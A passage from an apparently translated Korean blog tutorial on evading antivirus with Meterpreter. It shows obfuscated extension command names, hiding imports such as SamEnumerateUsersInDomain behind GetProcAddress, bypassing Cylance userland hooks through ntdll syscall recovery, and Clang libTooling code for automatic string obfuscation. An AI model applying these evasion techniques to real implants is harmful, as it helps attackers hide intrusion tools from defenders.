class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;Command customCommands[] =&#123;    COMMAND_REQ(hid_extapi_UQOoNXigAPq4, request_window_enum),    COMMAND_REQ(hid_extapi_vhFHmZ8u2hfz, request_service_enum),    COMMAND_REQ(hid_extapi_pW25eeIGBeru, request_service_query),    COMMAND_REQ(hid_extapi_S4Ws57MYBjib, request_service_control),    COMMAND_REQ(hid_extapi_HJ0lD9Dl56A4, request_clipboard_get_data),    COMMAND_REQ(hid_extapi_IiEzXils3UsR, request_clipboard_set_data),    COMMAND_REQ(hid_extapi_czLOBo0HcqCP, request_clipboard_monitor_start),    COMMAND_REQ(hid_extapi_WcWbTrsQujiT, request_clipboard_monitor_pause),    COMMAND_REQ(hid_extapi_rPiFTZW4ShwA, request_clipboard_monitor_resume),    COMMAND_REQ(hid_extapi_05fAoaZLqOoy, request_clipboard_monitor_purge),    COMMAND_REQ(hid_extapi_cOOyHTPTvZGK, request_clipboard_monitor_stop),    COMMAND_REQ(hid_extapi_smtmvW05cI9y, request_clipboard_monitor_dump),    COMMAND_REQ(hid_extapi_01kuYCM8z49k, request_adsi_domain_query),    COMMAND_REQ(hid_extapi_SMK9uFj6nThk, ntds_parse),    COMMAND_REQ(hid_extapi_PHxnGM7M0609, request_wmi_query),    COMMAND_REQ(hid_extapi_J7EGS6FRHwkV, request_pageant_send_query),    COMMAND_TERMINATOR&#125;;</code></pre><h2 id="API-Import-숨기기"><a href="#API-Import-숨기기" class="headerlink" title="API Import 숨기기"></a>API Import 숨기기</h2><p>외부 라이브러리에서 export 된 함수를 호출하면 linker가 <em>Import Address Table</em>(IAT)에 기록한다. 함수 이름은 바이너리에서 평문으로 볼 수 있고 실행하지 않고 정적으로 확인할 수 있다. 의심스러운 함수명들을 숨기고 정상적인 바이너리에 존재하는 것들은 유지하는 것이 좋다.</p><p>Meterpreter의 <em>kiwi</em> extension에서 다음과 같은 코드를 찾을 수 있다.</p><pre><code class="hljs cpp">enumStatus = SamEnumerateUsersInDomain(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourne</code></pre><p>이 함수는 <code>samlib.dll</code>에서 export 되므로 컴파일된 바이너리에는 <code>samlib.dll</code>과 <code>SamEnumberateUsersInDomain</code> 문자열이 표시된다.</p><p>이를 해결하기 위해 실행 중에 <code>LoadLibrary/GetProcAddress</code>를 사용하여 API를 가져올 수 있다. 이 함수들은 문자열을 인자로 사용하므로 난독화를 잘해야 한다. 따라서 위의 코드를 다음과 같이 재작성해야 한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall* _SamEnumerateUsersInDomain)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    SAMPR_HANDLE DomainHandle,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD EnumerationContext,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD UserAccountControl,</span></span><span class="hljs-function"><span class="hljs-params">    PSAMPR_RID_ENUMERATION* Buffer,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD PreferedMaximumLength,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD CountReturned</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-keyword">char</span> hid_SAMLIB_01zmejmkLCHt[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_SamEnu_BZxlW5ZBUAAe[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">0</span>&#125;;HANDLE hhid_SAMLIB_BZUriyLrlgrJ = LoadLibrary(hid_SAMLIB_01zmejmkLCHt);_SamEnumerateUsersInDomain ffSamEnumerateUsersInDoma =(_SamEnumerateUsersInDomain)GetProcAddress(hhid_SAMLIB_BZUriyLrlgrJ, hid_SamEnu_BZxlW5ZBUAAe);enumStatus = ffSamEnumerateUsersInDoma(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourned);</code></pre><h2 id="syscall-재작성"><a href="#syscall-재작성" class="headerlink" title="syscall 재작성"></a>syscall 재작성</h2><p>Cylance가 실행 중인 컴퓨터에서 Meterpreter의 <em>migrate</em>를 사용하면 안티바이러스 탐지가 실행된다. Cylance는 userland hook으로 프로세스 인젝션을 탐지한다. 탐지를 우회하려면 hook을 제거하는 것으로 간단히 우회할 수 있다. ntdll을 읽은 후 syscall 번호를 복구하고 ready-to-call shellcode에 삽입하는 것은 간단하고 userland hook을 효과적으로 우회한다. 필자는 지금까지 NTDLL.DLL을 악성 파일로 판단하는 것을 보지 못했다.</p><h1 id="구현"><a href="#구현" class="headerlink" title="구현"></a>구현</h1><p>앞서 말한 모든 아이디어들은 <em>libTooling</em>을 기반으로 한 source code refactoring tool에서 구현할 수 있다. 이 부분은 <em>libTooling</em> 문서가 부족해서 필자의 팀에서 가능한 시간 동안 한 것을 문서화했다. 따라서 개선의 여지가 있으며 무언가 눈에 띄는 경우 필자는 그것에 대해 듣고 싶다.</p><h2 id="추상-구문-트리-101"><a href="#추상-구문-트리-101" class="headerlink" title="추상 구문 트리 101"></a>추상 구문 트리 101</h2><p>컴파일러는 보통 여러 구성 요소로 구성되는데 일반적으로 <em>Parser</em>와 <em>Lexer</em>로 구성된다. 소스 코드가 컴파일러에 들어가면 먼저 프로그래머가 작성한 원본 소스 코드에서 Parse Tree를 생성하고 컴파일러가 필요로 하는 노드에 semantic information을 추가한다. 이 결과를 <em>Abstract Syntax Tree</em>(추상 구문 트리)라고 부른다. 다음은 위키피디아의 예시이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> b ≠ <span class="hljs-number">0</span>  <span class="hljs-keyword">if</span> a &gt; b    a := a − b  <span class="hljs-keyword">else</span>    b := b − a<span class="hljs-keyword">return</span> a</code></pre><p>간단한 프로그램의 일반적인 AST는 다음과 같다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/2.png"></p><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">추상 구문 트리 예시</a></p><p>이 데이터 구조는 다른 프로그램의 property를 이해하는 프로그램을 작성할 때 정밀한 알고리즘을 제공하므로 대규모 코드 refactoring에 적합하다.</p><h3 id="Clang’s-Abstract-Syntax-Tree"><a href="#Clang’s-Abstract-Syntax-Tree" class="headerlink" title="Clang’s Abstract Syntax Tree"></a>Clang’s Abstract Syntax Tree</h3><p>The Right Way의 소스 코드를 변경해야 하므로 Clang의 AST에 대해 알아야 한다. Clagn은 AST 덤프를 command-line switch에 예쁘게 표시하지만 컴파일러 플래그 설정이 까다롭다.</p><p>간단한 테스트 translation unit을 만들어보자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *f_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID *, ULONG, ULONG,</span></span><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER, PULONG, ULONG, ULONG, ULONG)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    f_NtMapViewOfSection lNtMapViewOfSection;    HMODULE ntdll;    <span class="hljs-keyword">if</span> (!(ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))))    &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, <span class="hljs-string">&quot;NtMapViewOfSection&quot;</span>);    lNtMapViewOfSection(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 다음 스크립트를 <code>.sh</code> 파일에 작성해라</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/headers/winsdk&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>#<span class="hljs-string">&quot;/usr/lib/clang/8.0.1/&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><p><code>WIN_INCLUDE</code>는 Win32 API와 interact 하기 위해 필요한 헤더들이 있는 폴더이다. 윈도우10에서 가져왔으며 MinGW에서 가져오지 말고 필자와 같은 방법으로 하는 것을 추천한다. 그 후 테스트 C 파일을 인자로 스크립트를 실행하면 18MB 파일이 생성되지만 <code>NtMapViewOfSection</code> 같은 우리가 선언한 문자열 리터럴을 검색해서 AST에서 봐야 할 부분으로 이동할 수 있다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/3.png"></p><p>AST를 시각화했으므로 어떻게 노드를 업데이트해야 소스 코드의 syntax 오류가 없을지 알 수 있다. 뒷부분은 <em>libTooling</em>을 통한 AST manipulation 구현에 대해서 상세히 다룬다.</p><h3 id="ClangTool-boilerplate"><a href="#ClangTool-boilerplate" class="headerlink" title="ClangTool boilerplate"></a>ClangTool boilerplate</h3><p>구현을 하기 전에 boilerplate 코드가 필요하므로 다음 코드를 <code>main.cpp</code>에 입력해라.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-comment">// LLVM includes</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Consumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><span class="hljs-keyword">namespace</span> ClSetup &#123;    llvm::<span class="hljs-function">cl::OptionCategory <span class="hljs-title">ToolCategory</span><span class="hljs-params">(<span class="hljs-string">&quot;StringEncryptor&quot;</span>)</span></span>;&#125;<span class="hljs-keyword">namespace</span> StringEncryptor &#123;    clang::Rewriter ASTRewriter;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> :</span> <span class="hljs-keyword">public</span> clang::ASTFrontendAction &#123;    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> ASTConsumerPointer = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;clang::ASTConsumer&gt;;        <span class="hljs-function">ASTConsumerPointer <span class="hljs-title">CreateASTConsumer</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler,</span></span><span class="hljs-function"><span class="hljs-params">                                             llvm::StringRef Filename)</span> <span class="hljs-keyword">override</span> </span>&#123;            ASTRewriter.setSourceMgr(Compiler.getSourceManager(), Compiler.getLangOpts());            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;ASTConsumer*&gt; consumers;            consumers.push_back(&amp;StringConsumer);              <span class="hljs-comment">// several passes can be combined together by adding them to `consumers`</span>            <span class="hljs-keyword">auto</span> TheConsumer = llvm::make_unique&lt;Consumer&gt;();            TheConsumer-&gt;consumers = consumers;            <span class="hljs-keyword">return</span> TheConsumer;        &#125;        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">BeginSourceFileAction</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler)</span> <span class="hljs-keyword">override</span> </span>&#123;            llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Processing file &quot;</span> &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EndSourceFileAction</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>&#123;            clang::SourceManager &amp;SM = ASTRewriter.getSourceMgr();            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> FileName = SM.getFileEntryForID(SM.getMainFileID())-&gt;getName();            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;** EndSourceFileAction for: &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;            <span class="hljs-comment">// Now emit the rewritten buffer.</span>            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;Here is the edited source file :\n\n&quot;</span>;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeS;            <span class="hljs-function">llvm::raw_string_ostream <span class="hljs-title">s</span><span class="hljs-params">(TypeS)</span></span>;            <span class="hljs-keyword">auto</span> FileID = SM.getMainFileID();            <span class="hljs-keyword">auto</span> ReWriteBuffer = ASTRewriter.getRewriteBufferFor(FileID);            <span class="hljs-keyword">if</span>(ReWriteBuffer != <span class="hljs-literal">nullptr</span>)                ReWriteBuffer-&gt;write((s));            <span class="hljs-keyword">else</span>&#123;                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;File was not modified\n&quot;</span>;                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> result = s.str();            <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fo</span><span class="hljs-params">(FileName)</span></span>;                   <span class="hljs-keyword">if</span>(fo.is_open())                fo &lt;&lt; result;            <span class="hljs-keyword">else</span>                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;[!] Error saving result to &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        &#125;    &#125;;&#125;auto main(int argc, const char *argv[]) -&gt; int &#123;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::tooling;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> ClSetup;    <span class="hljs-function">CommonOptionsParser <span class="hljs-title">OptionsParser</span><span class="hljs-params">(argc, argv, ToolCategory)</span></span>;    <span class="hljs-function">ClangTool <span class="hljs-title">Tool</span><span class="hljs-params">(OptionsParser.getCompilations(),</span></span><span class="hljs-function"><span class="hljs-params">                   OptionsParser.getSourcePathList())</span></span>;    <span class="hljs-keyword">auto</span> Action = newFrontendActionFactory&lt;StringEncryptor::Action&gt;();    <span class="hljs-keyword">return</span> Tool.run(Action.get());&#125;</code></pre><p>이 boilerplate 코드는 공식 문서에서 가져와서 설명하지 않는다. 언급할만한 변경점은 <code>CreateASTConsumer</code>이다. 우리의 목표는 같은 translation unit에서 여러 transformation pass를 수행하는 것이다. consumers collection(필수 line: <code>consumer.push_back(&amp;...);</code>)에 항목들을 추가하면 된다.</p><h2 id="문자열-난독화-1"><a href="#문자열-난독화-1" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>이 부분에서는 세 가지 단계로 구성된 문자열 난독화 패스에서 가장 중요한 구현 세부 사항을 설명한다.</p><ul><li>소스 코드에 문자열 리터럴을 찾는다.</li><li>그것들을 변수로 변환한다.</li><li>적절한 위치(함수 또는 전역 context 포함)에 변수 정의/할당을 삽입</li></ul><h3 id="소스-코드에서-문자열-리터럴-찾기"><a href="#소스-코드에서-문자열-리터럴-찾기" class="headerlink" title="소스 코드에서 문자열 리터럴 찾기"></a>소스 코드에서 문자열 리터럴 찾기</h3><p><code>StringConsumer</code>는 아래와 같이 정의될 수 있다.(<code>StringEncryptor</code> namespace의 앞부분)</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncryptionConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> StringEncryptor;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[StringEncryption] Registering ASTMatcher...\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">MatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = stringLiteral().bind(<span class="hljs-string">&quot;decl&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;&#125;;StringEncryptionConsumer StringConsumer = StringEncryptionConsumer();</code></pre><p>translation unit이 있으면 Clang이 AST에서 패턴을 찾을 수 있고 찾을 때마다 호출될 핸들러를 등록할 수 있다. <a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 강력한 패턴 매칭을 지원하지만 여기서는 문자열 리터럴만 찾으므로 충분히 활용되지 않는다.</p><p>우리는 <code>MatchHandler</code>를 구현하여 문제의 핵심을 파악할 수 있고 <code>MatchResult</code> instance를 얻을 수 있을 것이다. <code>MatchResult</code>는 식별된 AST 노드에 대한 참조와 중요한 context 정보를 포함한다.</p><p>클래스를 정의하여 <code>clang::ast_matchers::MatchFinder::MatchCallback</code>으로부터 좋은 stuff를 상속받자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatchHandler</span> :</span> <span class="hljs-keyword">public</span> clang::ast_matchers::MatchFinder::MatchCallback &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> MatchResult = clang::ast_matchers::MatchFinder::MatchResult;    MatchHandler(clang::Rewriter *rewriter);    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> <span class="hljs-keyword">override</span></span>; <span class="hljs-comment">// callback function that runs whenever a Match is found.</span>&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre><p><code>MatchHandler.cpp</code>에서 <code>MatchHandler</code>의 생성자와 <code>run</code> 콜백 함수를 구현해야 한다. <code>MatchHandler</code>의 생성자는 나중에 사용할 <code>clang::Rewriter</code>의 instance만 저장하면 되므로 간단하다.</p><pre><code class="hljs cpp"><span 